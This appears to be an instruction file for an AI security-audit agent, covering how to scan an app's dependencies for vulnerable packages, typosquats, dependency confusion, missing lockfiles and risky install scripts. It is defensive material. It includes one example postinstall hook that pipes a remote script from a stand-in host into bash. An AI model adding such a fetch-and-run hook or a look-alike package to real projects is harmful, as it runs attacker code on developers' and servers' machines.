# Check — Risky dependencies

**What you're looking for:** The third-party packages your app pulls in. Most of your code isn't code *you* wrote — it's hundreds of packages from `npm`, `pip`, `Go modules`, `RubyGems`, `Packagist`, or `CocoaPods`. Any one of them can be: outdated and known-broken, an evil look-alike of a real package (a "typosquat"), a package name that an attacker can grab off the public registry to impersonate your private one ("dependency confusion"), or a package that runs a script on your machine the moment you install it. The AI that built your app happily added whatever import made the demo work — it didn't check any of this.

This is the "your house is fine but you left the side gate open" check. The risk isn't in your code, it's in the code your code trusts.

## How to scan

You're doing two things: (1) **reading the manifest + lockfiles** to see what's declared and how it's pinned, and (2) **running the free built-in audit tool** for whatever ecosystem this is. No paid scanner needed — every package manager ships an audit command.

### Step 1 — Identify the ecosystems present

```bash
# What package ecosystems is this repo using?
ls -la package.json package-lock.json pnpm-lock.yaml yarn.lock \
       requirements.txt poetry.lock Pipfile.lock pyproject.toml \
       go.mod go.sum Gemfile Gemfile.lock composer.json composer.lock \
       Podfile Podfile.lock Package.resolved pubspec.lock \
       2>/dev/null
```

### Step 2 — Run the free built-in audit for each one

```bash
# JS/TS — npm (works even in pnpm/yarn repos if a package-lock exists; otherwise use the matching tool)
npm audit --omit=dev 2>/dev/null | tail -30
pnpm audit 2>/dev/null | tail -30
yarn audit 2>/dev/null | tail -30

# Python
pip-audit 2>/dev/null | tail -30          # if installed (pip install pip-audit)
pip list --outdated 2>/dev/null | head -30 # always available, shows stale packages

# Go — built in, no install needed
govulncheck ./... 2>/dev/null | tail -40   # if installed (go install golang.org/x/vuln/cmd/govulncheck@latest)
go list -m -u all 2>/dev/null | grep '\[' | head -30  # shows available upgrades

# Ruby
bundle audit check --update 2>/dev/null | tail -30  # bundler-audit gem
bundle outdated 2>/dev/null | head -30

# PHP
composer audit 2>/dev/null | tail -30
composer outdated --direct 2>/dev/null | head -30
```

If the audit tool isn't installed, don't block — fall back to reading the manifest and lockfiles by hand (Step 3) and tell the user the one-line install command so they can run it themselves.

### Step 3 — Read the manifests for the things audit tools miss

Audit tools catch *known* vulnerabilities. They do **not** catch typosquats, dependency-confusion exposure, missing lockfiles, or scary install scripts. You catch those by reading.

```bash
# Is there a lockfile at all? No lockfile = nobody knows what version actually ships.
ls package-lock.json pnpm-lock.yaml yarn.lock poetry.lock Pipfile.lock \
   go.sum Gemfile.lock composer.lock 2>/dev/null

# JS: find postinstall / preinstall / install lifecycle scripts in YOUR manifest
grep -nE '"(pre|post)?install"\s*:' package.json 2>/dev/null

# JS: find dependencies pinned to a git URL, http URL, or local tarball (supply-chain blind spots)
grep -nE '"[^"]+"\s*:\s*"(git\+|https?:|github:|file:|http:)' package.json 2>/dev/null

# JS: find internal/private scope names (dependency-confusion candidates)
grep -nE '"@[a-z0-9-]+/' package.json 2>/dev/null

# Python: find unpinned requirements (no == means "whatever's newest today")
grep -vE '==|>=|~=|@|^#|^\s*$' requirements.txt 2>/dev/null

# Python: find install-from-URL or VCS pins
grep -nE 'git\+|https?://|\.whl|\.tar\.gz' requirements.txt 2>/dev/null
```

### Mobile stacks — same idea, different files

```bash
# Swift (CocoaPods / SwiftPM)
cat Podfile 2>/dev/null | grep -nE "pod\s+'"           # declared pods
ls Podfile.lock Package.resolved 2>/dev/null            # lockfiles present?

# Kotlin / Android (Gradle)
grep -rnE "implementation|api|compileOnly" \
  --include='build.gradle' --include='build.gradle.kts' . 2>/dev/null | head -30
ls gradle/libs.versions.toml 2>/dev/null                # version catalog (good if present)

# Flutter / Dart
cat pubspec.yaml 2>/dev/null | grep -nE "^\s+[a-z_]+:"   # declared deps
ls pubspec.lock 2>/dev/null                              # lockfile present?
grep -nE "git:|path:|hosted:" pubspec.yaml 2>/dev/null   # non-pub.dev sources

# React Native (it's just npm — use the JS commands above, plus:)
ls ios/Podfile.lock android/build.gradle 2>/dev/null     # native sub-dependencies
```

## The patterns, and what each one means

### Pattern 1 — Known-vulnerable packages (what `audit` reports)

```
# example npm audit output
high   Prototype Pollution in lodash
  Dependency of: your-app
  Path: your-app > some-ui-lib > lodash
  More info: https://github.com/advisories/GHSA-xxxx
```

This is the easy one — the tool already did the work. Translate the count into the report. A handful of `low`/`moderate` advisories in dev-only tooling is normal and not scary. A `high` or `critical` advisory in a package that runs in production (auth, parsing user input, crypto, HTTP) is worth flagging.

**Severity:** 🟠 HIGH for a critical/high advisory in a production-path package. 🟡 MEDIUM for moderate advisories or vulns only reachable in dev/build tooling. 🔵 LOW for a pile of low-severity transitive noise.

### Pattern 2 — Typosquatted package (REAL ATTACK)

An attacker publishes `lodahs`, `reqeusts`, `crossenv`, `python-sqlite`, `electronic-mail` — names one keystroke or one synonym away from a package everybody uses. The AI (or a tired human at 2am) installs the wrong one, and it ships malware.

```json
// package.json — these are NOT real packages, they impersonate real ones
"dependencies": {
  "lodahs": "^1.0.0",        // ← real one is "lodash"
  "crossenv": "^7.0.0",      // ← real one is "cross-env"
  "discordapp.js": "^12.0.0" // ← real one is "discord.js"
}
```

How to spot it without a database: take each dependency name and ask "is this the spelling I'd expect for this well-known library?" Watch for transposed letters, missing/extra characters, a `.` where there should be a `-`, a singular/plural swap, or an org name baked into a non-scoped package (`discordapp.js` vs the scoped `@discordjs/...`). When in doubt, the package's real npm/PyPI page and its weekly download count are one search away — a "popular" library with 40 downloads/week is a counterfeit.

**Severity:** 🔴 CRITICAL if you can confirm a dependency name is a look-alike of a known package. This isn't a maybe — it's running on your machine and your server right now.

### Pattern 3 — Dependency confusion (REAL ATTACK, easy to miss)

You use a private/internal package — say `@acme-internal/auth-helpers` — that lives only on your private registry. If that exact name (or the unscoped `acme-auth-helpers`) is **not also claimed on the public registry**, an attacker can publish their own malicious package under that name. Depending on how your install is configured, the package manager may fetch the attacker's *public* version instead of your *private* one — because public registries sometimes win on higher version numbers.

```json
// package.json — uses a private-looking scope...
"dependencies": {
  "@acme-internal/billing": "^2.1.0"
}
```
```
// ...but .npmrc has no scope→registry mapping pinning it to your private registry:
//   (missing)  @acme-internal:registry=https://npm.acme.internal
// So npm asks the PUBLIC registry for "@acme-internal/billing" too.
```

The tell: an internal-sounding scope or package name in the manifest, **with no `.npmrc` / `.yarnrc.yml` / `pip.conf` / `poetry source` entry binding that scope to your private registry.** Same idea exists in Python (`--index-url` / `--extra-index-url` ordering), Gradle (`repositories {}` order), and RubyGems (`source` blocks).

**Severity:** 🟠 HIGH. It's not exploited until an attacker claims the name, but the door is wide open and the names of internal packages are often guessable.

### Pattern 4 — No lockfile / no integrity pinning

```bash
# requirements.txt with no versions at all
flask
requests
gunicorn
```

No lockfile (or unpinned versions) means "install whatever is newest the day this deploys." That sounds convenient, and it's exactly how a compromised package update lands in production without anyone choosing it. A lockfile freezes the exact versions *and* their cryptographic hashes, so a tampered package fails to install instead of silently shipping.

**Severity:** 🟡 MEDIUM. It's a latent risk, not an active bleed — but it's the mechanism that turns a future bad release into your incident.

### Pattern 5 — Risky install scripts

npm packages can run arbitrary code at install time via `preinstall`/`postinstall`. That's how a lot of supply-chain attacks actually execute. You're looking for two things: install scripts in *your own* manifest doing something surprising, and (as a heads-up) the fact that any dependency can do the same.

```json
// package.json — why is your app running a shell script on install?
"scripts": {
  "postinstall": "curl https://setup.example.sh | bash"  // ← run a remote script as you
}
```

**Severity:** 🟠 HIGH for a `postinstall` that fetches and executes remote code, or pipes to a shell. 🔵 LOW/INFO for an ordinary local build step (`postinstall: "patch-package"` or `"node ./scripts/build-native.js"`) — those are normal.

## Report a finding as

**Title (Pattern 2 example):** "You've got a fake `crossenv` package — it impersonates the real `cross-env`"

**Detail:**
> Your `package.json:14` lists `"crossenv"` as a dependency. The package developers actually use is `cross-env` (with a hyphen). `crossenv` is a known typosquat — a malicious package published under a name one character off from the real one, specifically to catch this mistake. It's been installed and it runs whenever you `npm install`.
>
> **What can go wrong:** Typosquat packages typically steal environment variables (which is where your API keys live) and POST them to an attacker's server the moment they install. If this has been in your project, assume any secret that's been in your `.env` during a build is compromised.
>
> **What to do tonight:**
> 1. Remove the fake one and install the real one:
>    ```bash
>    npm uninstall crossenv
>    npm install --save-dev cross-env
>    ```
> 2. Update the import/usage — the real package's binary is `cross-env`, not `crossenv`.
> 3. Because a typosquat may have already exfiltrated secrets, rotate every API key that's been in this project. Run `/lictor-rotate` and I'll walk you through each provider.
> 4. Delete `node_modules` and reinstall clean: `rm -rf node_modules && npm ci`.

---

**Title (Pattern 1 example):** "3 of your packages have known security holes (and 1 is in your live app)"

**Detail:**
> Running `npm audit` found 3 packages with published advisories. Two are dev-only build tools — not great, but they don't run in production, so they're low priority. The one that matters: `next@14.1.0` has a high-severity advisory (server-side request forgery in the image optimizer) and it runs on every page load.
>
> **What can go wrong:** A known, *published* advisory means there's a public write-up with a working exploit. Automated scanners crawl the internet looking for exactly these versions. This isn't "someone clever might" — it's "a bot will, this week."
>
> **What to do tonight:**
> 1. Let the package manager fix what it can automatically:
>    ```bash
>    npm audit fix
>    ```
> 2. For the production one, bump it explicitly and test:
>    ```bash
>    npm install next@latest && npm run build
>    ```
> 3. Re-run `npm audit` and confirm the high/critical count is 0. The dev-only moderates can wait.

---

**Title (Pattern 3 example):** "Your private package name isn't claimed publicly — an attacker could hijack it"

**Detail:**
> Your `package.json` depends on `@acme-internal/billing`, which sounds like an internal package on your own registry. But I don't see an `.npmrc` entry binding the `@acme-internal` scope to your private registry. That means `npm install` also asks the *public* npmjs.com for that name — and if someone publishes a package there under `@acme-internal/billing` with a higher version number, your build may pull the attacker's code instead of yours.
>
> **What can go wrong:** This is "dependency confusion." It's how researchers (and attackers) have breached Apple, Microsoft, and others — just by publishing a public package with a guessable internal name. The attacker's code then runs in your build pipeline with all its secrets.
>
> **What to do tonight:**
> 1. Pin the scope to your private registry in `.npmrc`:
>    ```
>    @acme-internal:registry=https://npm.acme.internal
>    //npm.acme.internal/:_authToken=${NPM_TOKEN}
>    ```
> 2. As a belt-and-suspenders move, claim the name on the public registry yourself (publish an empty placeholder), so no one else can.
> 3. Make sure your CI uses the same `.npmrc` and a lockfile, so the resolution can't drift.

## Don't false-positive on

- **A few low/moderate dev-dependency advisories.** Almost every real repo has these (a transitive dep of a test runner, a build-time tool). They don't run in production. Note the count as INFO; don't write a scary finding. Reserve HIGH for production-path packages.
- **`postinstall` that's an obvious local build step.** `patch-package`, `husky install`, `node ./scripts/postbuild.js`, `prisma generate`, `electron-builder install-app-deps` — these are normal and expected. Only flag install scripts that fetch remote code, pipe to a shell, or do something unrelated to building this project.
- **Pre-release / pinned beta versions chosen on purpose.** `"next": "15.0.0-canary.x"` or a `git+https` pin to a specific reviewed commit can be a deliberate, legitimate choice. Mention it as INFO if anything; don't call it a vuln.
- **Caret/tilde ranges (`^1.2.3`, `~1.2.3`) *when a lockfile exists*.** Ranges in the manifest are fine and standard — the lockfile is what actually pins the install. Only flag unpinned ranges when there is **no lockfile** to freeze them.
- **Major version "outdated" that isn't a vulnerability.** `npm outdated` / `pip list --outdated` will list dozens of packages with newer majors. Being behind is not the same as being vulnerable. Don't turn "you could upgrade" into a security finding — only flag outdated packages that have an actual published advisory (`audit`), or note upgrade hygiene as LOW at most.
- **Scoped packages from well-known orgs** (`@aws-sdk/*`, `@google-cloud/*`, `@types/*`, `@babel/*`). A scope is not a dependency-confusion risk by itself — it's only a concern when the scope is *private/internal* and not pinned to a private registry. Don't flag `@types/node`.
- **Lockfile present but `audit` tool not installed.** If you couldn't run the audit because the tool isn't on the machine, say so plainly ("couldn't run `pip-audit` — install it with `pip install pip-audit` and re-run") rather than reporting a clean bill of health you didn't actually verify.
